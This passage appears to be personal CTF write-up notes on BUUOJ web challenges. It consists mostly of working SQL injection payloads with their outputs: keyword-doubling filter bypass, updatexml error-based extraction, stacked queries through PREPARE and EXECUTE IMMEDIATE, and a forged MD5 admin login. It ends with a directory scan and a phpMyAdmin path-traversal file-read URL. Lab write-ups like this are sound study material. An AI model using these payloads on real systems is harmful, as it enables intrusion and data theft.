GET /check.php?username=1&password=1'%20uunionnion%20sselectelect%201,group_concat(column_name),3%20ffromrom%20infoorrmation_schema.columns%20wwherehere%20table_schema='geek'%20aandnd%20table_name='geekuser'--%20- HTTP/1.1
> id,username,password (b4bsql同)
......
```
### [2019 HardSQL](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]HardSQL)
报错注入
```
GET /check.php?username=1&password=1'or(updatexml(1,concat(0x7e,database(),0x7e),1));%23 HTTP/1.1
> XPATH syntax error: '~geek~'
GET /check.php?username=1&password=1'or(updatexml(1,concat(0x7e,(select(group_concat(schema_name))from(information_schema.schemata)),0x7e),1));%23 HTTP/1.1
> XPATH syntax error: '~information_schema,performance_'
GET /check.php?username=1&password=1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1));%23 HTTP/1.1
> XPATH syntax error: '~H4rDsq1~'
GET /check.php?username=1&password=1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e),1));%23 HTTP/1.1
> XPATH syntax error: '~id,username,password~'
GET /check.php?username=1&password=1'or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(geek.H4rDsq1)),0x7e),1));%23 HTTP/1.1
> XPATH syntax error: '~1flagflag{7acb6ee1-7e45-43ba-95'
GET /check.php?username=1&password=1'or(updatexml(1,right(concat(0x7e,(select(group_concat(password,id))from(geek.H4rDsq1)),0x7e),40),1));%23 HTTP/1.1
> XPATH syntax error: 'ee1-7e45-43ba-9594-00cbbe785abe}'
```
### [2019 FinalSQL](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]FinalSQL)
盲注。。。

## Web
### [Blacklist](https://buuoj.cn/challenges#[GYCTF2020]Blacklist)
```sql
1 or extractvalue(1, (select database()) )

return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);

1';show databases;#

array(1) {
  [0]=>
  string(11) "ctftraining"
}

1';show tables;#

array(1) {
  [0]=>
  string(8) "FlagHere"
}

1'; show columns from `FlagHere` ; #

array(6) {
  [0]=>
  string(4) "flag"
  [1]=>
  string(12) "varchar(100)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}

1';PREPARE hacker from concat('s','elect', ' * from `FlagHere` ');EXECUTE hacker;#

return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);

1';EXECUTE IMMEDIATE concat('s','elect',' * from `FlagHere` ');#
```
### [BabySQli](https://buuoj.cn/challenges#[GXYCTF2019]BabySQli)
```sh
name=admin'#&pw=1

wrong pass!

name=admin';show%20tables;#&pw=1

Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'show tables;#'' at line 1

name=admin';or%20show%20tables;#&pw=1

do not hack me!
```
可知过滤了`or/database()`
```sh
name=admin'%20union%20select%201,2,3#&pw=1

wrong pass!
```
F12及返回中都有注释，先base32再base64得到
```php
<!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5-->

b"select * from user where username = '$name'"

pw='abc'
md5(pw.encode()).hexdigest()
'900150983cd24fb0d6963f7d28e17f72'

name=1'union%20select%201,'admin','900150983cd24fb0d6963f7d28e17f72'#&pw=abc
```
是怎么猜出pw用了md5的？？？
### [I have a database](https://buuoj.cn/challenges#[GWCTF%202019]%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93)
```sh
 ./dirsearch.py -u http://08e377bc-2a2b-41f2-8df0-36cd7cd516f5.node5.buuoj.cn:81/ -e "*" --delay 0.1 -t 1 -i 200,403

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, html, htm, js, tar.gz
HTTP method: GET | Threads: 1 | Wordlist size: 15045

Target: http://08e377bc-2a2b-41f2-8df0-36cd7cd516f5.node5.buuoj.cn:81/

[14:21:29] Scanning: 
[14:24:54] 403 -   316B - /.php
[14:45:09] 200 -    6KB - /favicon.ico
[14:47:54] 200 -   184B - /index.html
[14:54:14] 200 -   86KB - /phpinfo.php
[14:54:53] 200 -   75KB - /phpmyadmin/
[14:54:53] 200 -   20KB - /phpmyadmin/ChangeLog
[14:54:53] 200 -   15KB - /phpmyadmin/doc/html/index.html
[14:54:54] 200 -   75KB - /phpmyadmin/index.php
[14:54:55] 200 -    1KB - /phpmyadmin/README
[14:57:21] 200 -    36B - /robots.txt
[14:58:02] 403 -   316B - /server-status
[14:58:02] 403 -   316B - /server-status/

Task Completed
```
phpmyadmin漏洞
```sh
http://08e377bc-2a2b-41f2-8df0-36cd7cd516f5.node5.buuoj.cn:81/phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag
```
